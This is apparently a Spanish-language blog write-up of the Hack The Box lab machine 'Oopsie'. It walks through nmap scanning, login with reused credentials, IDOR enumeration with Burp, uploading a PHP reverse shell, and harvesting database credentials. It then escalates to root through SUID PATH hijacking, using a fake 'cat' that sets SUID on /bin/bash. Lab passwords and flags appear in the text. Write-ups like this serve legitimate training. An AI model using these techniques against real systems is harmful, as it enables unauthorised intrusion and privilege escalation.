---
layout: post
title:  "Maquinas para empezar en HTB"
description: En esta ocasion empezaremos con el Writeup de la maquina de StartingPoint de HackTheBox llamada Oopsie
tags: HTB, Empezando, Hacking, Starting
---

# Oopsie ~ Hack The Box

Comprobamos que la maquina este activa con una traza ICMP, usamos la herramienta PING.
```bash
# ping -c 10 10.10.10.28                                                                                   
PING 10.10.10.28 (10.10.10.28) 56(84) bytes of data.
64 bytes from 10.10.10.28: icmp_seq=1 ttl=63 time=39.0 ms
64 bytes from 10.10.10.28: icmp_seq=2 ttl=63 time=39.2 ms
64 bytes from 10.10.10.28: icmp_seq=3 ttl=63 time=38.9 ms
^C
--- 10.10.10.28 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2004ms
rtt min/avg/max/mdev = 38.941/39.048/39.192/0.105 ms
```
# Enumeracion con Nmap

Procedemos a enumerar todos los puertos abiertos en un escaneo usando los siguiente parametros:

```bash
 "nmap -p- --open -T5 -v -n -Pn 10.10.10.28   " 
```  
 Si en la maquina victima el escaneo con Nmap va lento..
 Usamos el siguiente escaneo:
 
```bash
 "nmap -p- --open -sS --min-rate 4000 -vvv -n -Pn 10.10.10.28 -oG allports    "
```
Con la funcion de extractPorts: filtramos por los puertos abiertos pasandole el archivo de salida del primer escaneo con Nmap
```bash
# extractPorts allports

[*] Extracting information .......

        [*]IP ADDRESS: 10.10.10.28
        [*]OPEN PORTS: 22,80

[*] Puertos han sido copiados to clipboard .......
```
 2.- Siguiente Escaneo con Nmap
 
Procedemos a escanear la version y servicios de los puerto encontrados como abiertos:
```bash
nmap -sC -sV -p22,80 -oN Target 10.10.10.28
```
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)
|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)
|_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Welcome
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Enumeramos con la herramienta `whatweb`
```bash
cat content/whatweb.txt 
http://10.10.10.28/ [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], Email[admin@megacorp.com], HTML5,
HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.28], Script, Title[Welcome]
``` 
Nos saca un Email `admin@megacorp.com`
Hechamos un vistazo a la pagina web:
<a href="https://ibb.co/G9fVChw"><img src="https://i.ibb.co/MfyRPXT/Inicio-web.png" alt="Inicio-web.png" border="0" /></a>

hacemos Ctrl+u para ver el codigo fuente de la pagina
```bash
   </script>
<script src="/cdn-cgi/login/script.js"></script>
<script src="/js/index.js"></script>
</body>
</html>
```
encontramos este redireccionamiento a la ruta `cdn-cgi/login/script.js`
Probamos la ruta sin el `script.js`
<a href="https://ibb.co/0Yd0rKF"><img src="https://i.ibb.co/F8jQzX0/login-web.png" alt="Login-web.png" border="0" /></a>
```bash
http://10.10.10.28/cdn-cgi/login/admin.php
```
Para esta maquina probamos las credenciales obtenidas en la Maquina ARCHETYPE
```bash
User: admin
Pass: MEGACORP_4dm1n!!
``` 
Nos conseguimos loguear corectamente a la pagina web.

<a href="https://ibb.co/StxDMCy"><img src="https://i.ibb.co/QPc7TwQ/Inside-web.png" alt="Inside-web.png" border="0" /></a>

Una vez dentro vemos que tenemos un campo de `Uploads` intentamos hacer uso y vemos que el user administrador de la web tiene puesto algun tipo de restriccion de seguridad
para todos los Users menos el Super Admin

# Usamos la herramienta `Bursuite` para encontrar atraves de un ataque de tipo intruder al super admin en la pestaña accounts atraves del campo id

<a href="https://ibb.co/5MDc1Kd"><img src="https://i.ibb.co/ZLsTf23/burpsuite-1.png" alt="Burpsuite-1.png" border="0" /></a>

Una vez encontramos el `id=30` para el `Super Admin`

<a href="https://ibb.co/DtJbWGK"><img src="https://i.ibb.co/c1Bv3bT/Burpsuite-2.png" alt="Burpsuite-2.png" border="0" /></a>

Identificamos el valor Access ID que nos va a permitir entrar en la pestaña uploads para intentar subir nuestro `php-reverse-shell.php malicioso` 
y que la maquina nos lo interprete para conseguir una terminal como `www-data`

<a href="https://ibb.co/m0Cqx00"><img src="https://i.ibb.co/C657r66/Screenshot-2021-05-15-19-38-45-2.png" alt="Screenshot-2021-05-15-19-38-45-2.png" border="0" /></a>

Procedemos a Usar `Burpsuite`otra vez para subir nuestro archivo `php malicioso`

<a href="https://ibb.co/R3jq6Vm"><img src="https://i.ibb.co/zX6z20Y/Burpsuite-Rshell.png" alt="Burpsuite-Rshell.png" border="0" /></a>

Conseguimos nuestra shell como el user `www-data` apuntando a la ruta de nuestro archivo `php malicioso` que acabamos de subir

Buscamos por usuarios a nivel de sistema:
```bash
www-data@oopsie:/$ cd home/
www-data@oopsie:/home$ ls
robert
www-data@oopsie:/home$ cd robert/
www-data@oopsie:/home/robert$ ls
user.txt
www-data@oopsie:/home/robert$ cat user.txt 
f2c74ee8db7983851ab2a96a
```
Ahi tendriamos la primera flag o user.txt 

# Escalada de Privilegios

Nos dedicamos a enumerar el sistema en la ruta de la web para ver si encontramos algun fichero de configuracion con las credenciales del user administrador
```bash
www-data@oopsie:/var/www/html/cdn-cgi/login$ cat db.php 
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>
```
Credenciales para la base de datos de mysql o 
para probar comprobar si se hace uso de la reutilizacion de credenciales a nivel de sistema por el servicio SSH:

`robert`
`M3g4c0rpUs3r!` 

Probamos con el servicio SSH a conectarnos como el usuario Robert
```bash
# ssh robert@10.10.10.28              
The authenticity of host '10.10.10.28 (10.10.10.28)' can't be established.
ECDSA key fingerprint is SHA256:JmIUfqU8/Xv/1Fy/m/Clya5iX2K756n/EGu0eeJb5xc.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.28' (ECDSA) to the list of known hosts.
robert@10.10.10.28's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-76-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat May 15 18:07:17 UTC 2021

  System load:  0.0                Processes:             140
  Usage of /:   25.6% of 19.56GB   Users logged in:       0
  Memory usage: 20%                IP address for ens160: 10.10.10.28
  Swap usage:   0%

 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

0 packages can be updated.
0 updates are security updates.

Last login: Sat Jan 25 10:20:16 2020 from 172.16.118.129
robert@oopsie:~$ ls
user.txt
```
Listamos por permisos `SUID` ya que vemos que con `$sudo -l` no tenemos privilegio para usar `sudo`
```bash
robert@oopsie:~$ find / -perm -u=s -type f 2>/dev/null | xargs ls -l
.
.
-rwsr-xr-- 1 root   bugtracker        8792 Jan 25  2020 /usr/bin/bugtracker
.
```
Nos llama la atencion un permiso SUID como root a un binario personalizado. Vamos a probar a ejecutarlo para ver lo que hace:
```bash
robert@oopsie:~$ /usr/bin/bugtracker
------------------
: EV Bug Tracker :
------------------
Provide Bug ID: 0
---------------

cat: /root/reports/0: No such file or directory
```
Vemos que usar el binario cat y no lo llama de manera absoluta(Con su ruta entera). Se me ocurre la idea de hacer un path Hijacking, creando un archivo llamado cat, que nos ejecute el comando 
que nosotros le digamos haciendo uso del permiso SUID y suplantando la ruta del PATH para que pille antes el cat malicioso nuestro.
Nos movemos a la ruta `/tmp/` y creamos nuestro archivo `cat` malicioso para que nos de privilegios SUID a la `/bin/bash`
```bash
chmod 4755 /bin/bash
```
Ahora vamos a proceder con el PATH HIJACKING:
```bash
export PATH=/tmp:$PATH
chmod +x cat
```
Y procedemos a ejecutar el `/usr/bin/bugtrack` para que ejecute nuestro `cat malicioso`
```bash
robert@oopsie:/tmp$ /usr/bin/bugtracker
------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 1
---------------
```
Comprobamos que la /bin/bash tenga privilegios como SUID para ahora haciendo un `bash -p`convertirnos en `root` y sacar la flag de administrator.

```bash
robert@oopsie:/tmp$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1113504 Jun  6  2019 /bin/bash

robert@oopsie:/tmp$ bash -p
bash-4.4# whoami
root
´´´
Sacando la Flag Root.txt
```bash
bash-4.4# nano /root/root.txt
f13b0bee69f8a877c3faf667
```
Maquina Rooteada !!
